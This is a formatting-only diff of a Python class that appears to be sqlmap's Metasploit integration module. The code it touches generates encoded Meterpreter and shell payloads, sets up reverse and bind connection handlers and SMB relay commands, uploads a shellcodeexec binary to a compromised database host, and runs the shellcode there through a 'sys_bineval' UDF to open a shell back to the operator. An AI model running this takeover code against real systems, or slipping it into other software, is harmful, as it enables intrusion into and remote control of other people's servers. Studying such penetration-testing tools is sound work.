@@ -49,6 +49,7 @@ from lib.core.subprocessng import recv_some
 if IS_WIN:
     import msvcrt
 
+
 class Metasploit:
     """
     This class defines methods to call Metasploit for plugins.
@@ -65,9 +66,12 @@ class Metasploit:
         self.localIP = getLocalIP()
         self.remoteIP = getRemoteIP() or conf.hostname
         self._msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli"))
-        self._msfConsole = normalizePath(os.path.join(conf.msfPath, "msfconsole"))
-        self._msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode"))
-        self._msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload"))
+        self._msfConsole = normalizePath(
+            os.path.join(conf.msfPath, "msfconsole"))
+        self._msfEncode = normalizePath(
+            os.path.join(conf.msfPath, "msfencode"))
+        self._msfPayload = normalizePath(
+            os.path.join(conf.msfPath, "msfpayload"))
         self._msfVenom = normalizePath(os.path.join(conf.msfPath, "msfvenom"))
 
         if IS_WIN:
@@ -88,60 +92,60 @@ class Metasploit:
             self._msfVenom = "%s & ruby %s" % (_, self._msfVenom)
 
         self._msfPayloadsList = {
-                                      "windows": {
-                                                   1: ("Meterpreter (default)", "windows/meterpreter"),
-                                                   2: ("Shell", "windows/shell"),
-                                                   3: ("VNC", "windows/vncinject"),
-                                                 },
-                                      "linux":   {
-                                                   1: ("Shell (default)", "linux/x86/shell"),
-                                                   2: ("Meterpreter (beta)", "linux/x86/meterpreter"),
-                                                 }
-                                    }
+            "windows": {
+                1: ("Meterpreter (default)", "windows/meterpreter"),
+                2: ("Shell", "windows/shell"),
+                3: ("VNC", "windows/vncinject"),
+            },
+            "linux": {
+                1: ("Shell (default)", "linux/x86/shell"),
+                2: ("Meterpreter (beta)", "linux/x86/meterpreter"),
+            }
+        }
 
         self._msfConnectionsList = {
-                                      "windows": {
-                                                   1: ("Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp"),
-                                                   2: ("Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535", "reverse_tcp_allports"),
-                                                   3: ("Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP", "reverse_http"),
-                                                   4: ("Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS", "reverse_https"),
-                                                   5: ("Bind TCP: Listen on the database host for a connection", "bind_tcp"),
-                                                 },
-                                      "linux":   {
-                                                   1: ("Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp"),
-                                                   2: ("Bind TCP: Listen on the database host for a connection", "bind_tcp"),
-                                                 }
-                                    }
+            "windows": {
+                1: ("Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp"),
+                2: ("Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535", "reverse_tcp_allports"),
+                3: ("Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP", "reverse_http"),
+                4: ("Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS", "reverse_https"),
+                5: ("Bind TCP: Listen on the database host for a connection", "bind_tcp"),
+            },
+            "linux": {
+                1: ("Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp"),
+                2: ("Bind TCP: Listen on the database host for a connection", "bind_tcp"),
+            }
+        }
 
         self._msfEncodersList = {
-                                      "windows": {
-                                                   1: ("No Encoder", "generic/none"),
-                                                   2: ("Alpha2 Alphanumeric Mixedcase Encoder", "x86/alpha_mixed"),
-                                                   3: ("Alpha2 Alphanumeric Uppercase Encoder", "x86/alpha_upper"),
-                                                   4: ("Avoid UTF8/tolower", "x86/avoid_utf8_tolower"),
-                                                   5: ("Call+4 Dword XOR Encoder", "x86/call4_dword_xor"),
-                                                   6: ("Single-byte XOR Countdown Encoder", "x86/countdown"),
-                                                   7: ("Variable-length Fnstenv/mov Dword XOR Encoder", "x86/fnstenv_mov"),
-                                                   8: ("Polymorphic Jump/Call XOR Additive Feedback Encoder", "x86/jmp_call_additive"),
-                                                   9: ("Non-Alpha Encoder", "x86/nonalpha"),
-                                                  10: ("Non-Upper Encoder", "x86/nonupper"),
-                                                  11: ("Polymorphic XOR Additive Feedback Encoder (default)", "x86/shikata_ga_nai"),
-                                                  12: ("Alpha2 Alphanumeric Unicode Mixedcase Encoder", "x86/unicode_mixed"),
-                                                  13: ("Alpha2 Alphanumeric Unicode Uppercase Encoder", "x86/unicode_upper"),
-                                                 }
-                                    }
+            "windows": {
+                1: ("No Encoder", "generic/none"),
+                2: ("Alpha2 Alphanumeric Mixedcase Encoder", "x86/alpha_mixed"),
+                3: ("Alpha2 Alphanumeric Uppercase Encoder", "x86/alpha_upper"),
+                4: ("Avoid UTF8/tolower", "x86/avoid_utf8_tolower"),
+                5: ("Call+4 Dword XOR Encoder", "x86/call4_dword_xor"),
+                6: ("Single-byte XOR Countdown Encoder", "x86/countdown"),
+                7: ("Variable-length Fnstenv/mov Dword XOR Encoder", "x86/fnstenv_mov"),
+                8: ("Polymorphic Jump/Call XOR Additive Feedback Encoder", "x86/jmp_call_additive"),
+                9: ("Non-Alpha Encoder", "x86/nonalpha"),
+                10: ("Non-Upper Encoder", "x86/nonupper"),
+                11: ("Polymorphic XOR Additive Feedback Encoder (default)", "x86/shikata_ga_nai"),
+                12: ("Alpha2 Alphanumeric Unicode Mixedcase Encoder", "x86/unicode_mixed"),
+                13: ("Alpha2 Alphanumeric Unicode Uppercase Encoder", "x86/unicode_upper"),
+            }
+        }
 
         self._msfSMBPortsList = {
-                                      "windows": {
-                                                   1: ("139/TCP", "139"),
-                                                   2: ("445/TCP (default)", "445"),
-                                                 }
-                                    }
+            "windows": {
+                1: ("139/TCP", "139"),
+                2: ("445/TCP (default)", "445"),
+            }
+        }
 
         self._portData = {
-                            "bind": "remote port number",
-                            "reverse": "local port number",
-                          }
+            "bind": "remote port number",
+            "reverse": "local port number",
+        }
 
     def _skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
         if Backend.isOs(OS.WINDOWS):
@@ -178,7 +182,9 @@ class Metasploit:
             return self._skeletonSelection(msg, lst, maxValue, default)
 
         elif int(choice) > maxValue or int(choice) < 1:
-            logger.warn("invalid value, it must be a digit between 1 and %d" % maxValue)
+            logger.warn(
+                "invalid value, it must be a digit between 1 and %d" %
+                maxValue)
             return self._skeletonSelection(msg, lst, maxValue, default)
 
         choice = int(choice)
@@ -200,7 +206,8 @@ class Metasploit:
             return encode
 
         elif encode:
-            return self._skeletonSelection("payload encoding", self._msfEncodersList)
+            return self._skeletonSelection(
+                "payload encoding", self._msfEncodersList)
 
     def _selectPayload(self):
         if Backend.isOs(OS.WINDOWS) and conf.privEsc:
@@ -212,7 +219,8 @@ class Metasploit:
 
             _payloadStr = "windows/meterpreter"
         else:
-            _payloadStr = self._skeletonSelection("payload", self._msfPayloadsList)
+            _payloadStr = self._skeletonSelection(
+                "payload", self._msfPayloadsList)
 
         if _payloadStr == "windows/vncinject":
             choose = False
@@ -261,7 +269,8 @@ class Metasploit:
 
                     elif choice == "1":
                         if Backend.isDbms(DBMS.PGSQL):
-                            logger.warn("beware that the VNC injection might not work")
+                            logger.warn(
+                                "beware that the VNC injection might not work")
 
                             break
 
@@ -274,8 +283,10 @@ class Metasploit:
                     elif int(choice) < 1 or int(choice) > 2:
                         logger.warn("invalid value, it must be 1 or 2")
 
-        if self.connectionStr.startswith("reverse_http") and _payloadStr != "windows/meterpreter":
-            warnMsg = "Reverse HTTP%s connection is only supported " % ("S" if self.connectionStr.endswith("s") else "")
+        if self.connectionStr.startswith(
+                "reverse_http") and _payloadStr != "windows/meterpreter":
+            warnMsg = "Reverse HTTP%s connection is only supported " % (
+                "S" if self.connectionStr.endswith("s") else "")
             warnMsg += "with the Meterpreter payload. Falling back to "
             warnMsg += "reverse TCP"
             logger.warn(warnMsg)
@@ -287,7 +298,9 @@ class Metasploit:
     def _selectPort(self):
         for connType, connStr in self._portData.items():
             if self.connectionStr.startswith(connType):
-                return self._skeletonSelection(connStr, maxValue=65535, default=randomRange(1025, 65535))
+                return self._skeletonSelection(
+                    connStr, maxValue=65535, default=randomRange(
+                        1025, 65535))
 
     def _selectRhost(self):
         if self.connectionStr.startswith("bind"):
@@ -322,7 +335,8 @@ class Metasploit:
             raise SqlmapDataException("unexpected connection type")
 
     def _selectConnection(self):
-        return self._skeletonSelection("connection type", self._msfConnectionsList)
+        return self._skeletonSelection(
+            "connection type", self._msfConnectionsList)
 
     def _prepareIngredients(self, encode=True):
         self.connectionStr = self._selectConnection()
@@ -335,7 +349,8 @@ class Metasploit:
 
     def _forgeMsfCliCmd(self, exitfunc="process"):
         if kb.oldMsf:
-            self._cliCmd = "%s multi/handler PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
+            self._cliCmd = "%s multi/handler PAYLOAD=%s" % (
+                self._msfCli, self.payloadConnStr)
             self._cliCmd += " EXITFUNC=%s" % exitfunc
             self._cliCmd += " LPORT=%s" % self.portStr
 
@@ -346,12 +361,14 @@ class Metasploit:
             else:
                 raise SqlmapDataException("unexpected connection type")
 
-            if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
+            if Backend.isOs(
+                    OS.WINDOWS) and self.payloadStr == "windows/vncinject":
                 self._cliCmd += " DisableCourtesyShell=true"
 
             self._cliCmd += " E"
         else:
-            self._cliCmd = "%s -L -x 'use multi/handler; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
+            self._cliCmd = "%s -L -x 'use multi/handler; set PAYLOAD %s" % (
+                self._msfConsole, self.payloadConnStr)
             self._cliCmd += "; set EXITFUNC %s" % exitfunc
             self._cliCmd += "; set LPORT %s" % self.portStr
 
@@ -362,7 +379,8 @@ class Metasploit:
             else:
                 raise SqlmapDataException("unexpected connection type")
 
-            if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
+            if Backend.isOs(
+                    OS.WINDOWS) and self.payloadStr == "windows/vncinject":
                 self._cliCmd += "; set DisableCourtesyShell true"
 
             self._cliCmd += "; exploit'"
@@ -371,7 +389,8 @@ class Metasploit:
         self._prepareIngredients(encode=False)
 
         if kb.oldMsf:
-            self._cliCmd = "%s windows/smb/smb_relay PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
+            self._cliCmd = "%s windows/smb/smb_relay PAYLOAD=%s" % (
+                self._msfCli, self.payloadConnStr)
             self._cliCmd += " EXITFUNC=thread"
             self._cliCmd += " LPORT=%s" % self.portStr
             self._cliCmd += " SRVHOST=%s" % self.lhostStr
@@ -386,7 +405,8 @@ class Metasploit:
 
             self._cliCmd += " E"
         else:
-            self._cliCmd = "%s -x 'use windows/smb/smb_relay; set PAYLOAD %s" % (self._msfConsole, self.payloadConnStr)
+            self._cliCmd = "%s -x 'use windows/smb/smb_relay; set PAYLOAD %s" % (
+                self._msfConsole, self.payloadConnStr)
             self._cliCmd += "; set EXITFUNC thread"
             self._cliCmd += "; set LPORT %s" % self.portStr
             self._cliCmd += "; set SRVHOST %s" % self.lhostStr
@@ -421,7 +441,8 @@ class Metasploit:
 
         if kb.oldMsf:
             if extra == "BufferRegister=EAX":
-                self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)
+                self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (
+                    self._msfEncode, self.encoderStr, outFile, format)
 
                 if extra is not None:
                     self._payloadCmd += " %s" % extra
@@ -429,7 +450,8 @@ class Metasploit:
                 self._payloadCmd += " X > \"%s\"" % outFile
         else:
             if extra == "BufferRegister=EAX":
-                self._payloadCmd += " -a x86 -e %s -f %s" % (self.encoderStr, format)
+                self._payloadCmd += " -a x86 -e %s -f %s" % (
+                    self.encoderStr, format)
 
                 if extra is not None:
                     self._payloadCmd += " %s" % extra
@@ -446,7 +468,13 @@ class Metasploit:
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
-        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
+        self._msfCliProc = execute(
+            self._cliCmd,
+            shell=True,
+            stdin=PIPE,
+            stdout=PIPE,
+            stderr=PIPE,
+            close_fds=False)
 
     def _runMsfCli(self, exitfunc):
         self._forgeMsfCliCmd(exitfunc)
@@ -456,14 +484,24 @@ class Metasploit:
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
-        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
+        self._msfCliProc = execute(
+            self._cliCmd,
+            shell=True,
+            stdin=PIPE,
+            stdout=PIPE,
+            stderr=PIPE,
+            close_fds=False)
 
     def _runMsfShellcodeRemote(self):
         infoMsg = "running Metasploit Framework shellcode "
         infoMsg += "remotely via UDF 'sys_bineval', please wait.."
         logger.info(infoMsg)
 
-        self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")
+        self.udfExecCmd(
+            "'%s'" %
+            self.shellcodeString,
+            silent=True,
+            udfName="sys_bineval")
 
     def _runMsfShellcodeRemoteViaSexec(self):
         infoMsg = "running Metasploit Framework shellcode remotely "
@@ -474,7 +512,8 @@ class Metasploit:
             self.execCmd("chmod +x %s" % self.shellcodeexecRemote, silent=True)
             cmd = "%s %s &" % (self.shellcodeexecRemote, self.shellcodeString)
         else:
-            cmd = "\"%s\" %s" % (self.shellcodeexecRemote, self.shellcodeString)
+            cmd = "\"%s\" %s" % (self.shellcodeexecRemote,
+                                 self.shellcodeString)
 
         self.execCmd(cmd, silent=True)
 
@@ -576,13 +615,16 @@ class Metasploit:
                 timeout = time.time() - start_time > METASPLOIT_SESSION_TIMEOUT
 
                 if not initialized:
-                    match = re.search(r"Meterpreter session ([\d]+) opened", out)
+                    match = re.search(
+                        r"Meterpreter session ([\d]+) opened", out)
 
                     if match:
                         self._loadMetExtensions(proc, match.group(1))
 
                         if "shell" in self.payloadStr:
-                            send_all(proc, "whoami\n" if Backend.isOs(OS.WINDOWS) else "uname -a ; id\n")
+                            send_all(
+                                proc, "whoami\n" if Backend.isOs(
+                                    OS.WINDOWS) else "uname -a ; id\n")
                             time.sleep(2)
 
                         initialized = True
@@ -609,20 +651,33 @@ class Metasploit:
         logger.info(infoMsg)
 
         self._randStr = randomStr(lowercase=True)
-        self._shellcodeFilePath = os.path.join(conf.outputPath, "tmpm%s" % self._randStr)
+        self._shellcodeFilePath = os.path.join(
+            conf.outputPath, "tmpm%s" %
+            self._randStr)
 
         Metasploit._initVars(self)
         self._prepareIngredients(encode=encode)
-        self._forgeMsfPayloadCmd(exitfunc, format, self._shellcodeFilePath, extra)
+        self._forgeMsfPayloadCmd(
+            exitfunc, format, self._shellcodeFilePath, extra)
 
         logger.debug("executing local command: %s" % self._payloadCmd)
-        process = execute(self._payloadCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
+        process = execute(
+            self._payloadCmd,
+            shell=True,
+            stdin=PIPE,
+            stdout=PIPE,
+            stderr=PIPE,
+            close_fds=False)
 
-        dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
+        dataToStdout(
+            "\r[%s] [INFO] creation in progress " %
+            time.strftime("%X"))
         pollProcess(process)
         payloadStderr = process.communicate()[1]
 
-        match = re.search(r"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\d]+)", payloadStderr)
+        match = re.search(
+            r"(Total size:|Length:|succeeded with size|Final size of exe file:) ([\d]+)",
+            payloadStderr)
 
         if match:
             payloadSize = int(match.group(2))
@@ -633,7 +688,8 @@ class Metasploit:
             debugMsg = "the shellcode size is %d bytes" % payloadSize
             logger.debug(debugMsg)
         else:
-            errMsg = "failed to create the shellcode (%s)" % payloadStderr.replace("\n", " ").replace("\r", "")
+            errMsg = "failed to create the shellcode (%s)" % payloadStderr.replace(
+                "\n", " ").replace("\r", "")
             raise SqlmapFilePathException(errMsg)
 
         self._shellcodeFP = open(self._shellcodeFilePath, "rb")
@@ -643,32 +699,56 @@ class Metasploit:
         os.unlink(self._shellcodeFilePath)
 
     def uploadShellcodeexec(self, web=False):
-        self.shellcodeexecLocal = os.path.join(paths.SQLMAP_EXTRAS_PATH, "shellcodeexec")
+        self.shellcodeexecLocal = os.path.join(
+            paths.SQLMAP_EXTRAS_PATH, "shellcodeexec")
 
         if Backend.isOs(OS.WINDOWS):
-            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "windows", "shellcodeexec.x%s.exe_" % "32")
+            self.shellcodeexecLocal = os.path.join(
+                self.shellcodeexecLocal,
+                "windows",
+                "shellcodeexec.x%s.exe_" %
+                "32")
             content = decloak(self.shellcodeexecLocal)
             if SHELLCODEEXEC_RANDOM_STRING_MARKER in content:
-                content = content.replace(SHELLCODEEXEC_RANDOM_STRING_MARKER, randomStr(len(SHELLCODEEXEC_RANDOM_STRING_MARKER)))
+                content = content.replace(
+                    SHELLCODEEXEC_RANDOM_STRING_MARKER, randomStr(
+                        len(SHELLCODEEXEC_RANDOM_STRING_MARKER)))
                 _ = cloak(data=content)
-                handle, self.shellcodeexecLocal = tempfile.mkstemp(suffix="%s.exe_" % "32")
+                handle, self.shellcodeexecLocal = tempfile.mkstemp(
+                    suffix="%s.exe_" % "32")
                 os.close(handle)
                 with open(self.shellcodeexecLocal, "w+b") as f:
                     f.write(_)
         else:
-            self.shellcodeexecLocal = os.path.join(self.shellcodeexecLocal, "linux", "shellcodeexec.x%s_" % Backend.getArch())
+            self.shellcodeexecLocal = os.path.join(
+                self.shellcodeexecLocal,
+                "linux",
+                "shellcodeexec.x%s_" %
+                Backend.getArch())
 
-        __basename = "tmpse%s%s" % (self._randStr, ".exe" if Backend.isOs(OS.WINDOWS) else "")
+        __basename = "tmpse%s%s" % (self._randStr,
+                                    ".exe" if Backend.isOs(OS.WINDOWS) else "")
 
         self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
-        self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))
+        self.shellcodeexecRemote = ntToPosixSlashes(
+            normalizePath(self.shellcodeexecRemote))
 
-        logger.info("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)
+        logger.info(
+            "uploading shellcodeexec to '%s'" %
+            self.shellcodeexecRemote)
 
         if web:
-            written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0], filepath=self.shellcodeexecLocal)
+            written = self.webUpload(
+                self.shellcodeexecRemote,
+                os.path.split(
+                    self.shellcodeexecRemote)[0],
+                filepath=self.shellcodeexecLocal)
         else:
-            written = self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary", forceCheck=True)
+            written = self.writeFile(
+                self.shellcodeexecLocal,
+                self.shellcodeexecRemote,
+                "binary",
+                forceCheck=True)
 
         if written is not True:
             errMsg = "there has been a problem uploading shellcodeexec, it "
@@ -699,7 +779,8 @@ class Metasploit:
             func()
 
         debugMsg = "Metasploit Framework command line interface exited "
-        debugMsg += "with return code %s" % self._controlMsfCmd(self._msfCliProc, func)
+        debugMsg += "with return code %s" % self._controlMsfCmd(
+            self._msfCliProc, func)
         logger.debug(debugMsg)
 
         if not goUdf:
@@ -718,7 +799,8 @@ class Metasploit:
             self.uncPath = "\\\\%s\\%s" % (self.lhostStr, self._randFile)
 
         debugMsg = "Metasploit Framework console exited with return "
-        debugMsg += "code %s" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)
+        debugMsg += "code %s" % self._controlMsfCmd(
+            self._msfCliProc, self.uncPathRequest)
         logger.debug(debugMsg)
 
     def bof(self):
@@ -728,5 +810,6 @@ class Metasploit:
             self.spHeapOverflow()
 
         debugMsg = "Metasploit Framework command line interface exited "
-        debugMsg += "with return code %s" % self._controlMsfCmd(self._msfCliProc, self.spHeapOverflow)
+        debugMsg += "with return code %s" % self._controlMsfCmd(
+            self._msfCliProc, self.spHeapOverflow)
         logger.debug(debugMsg)
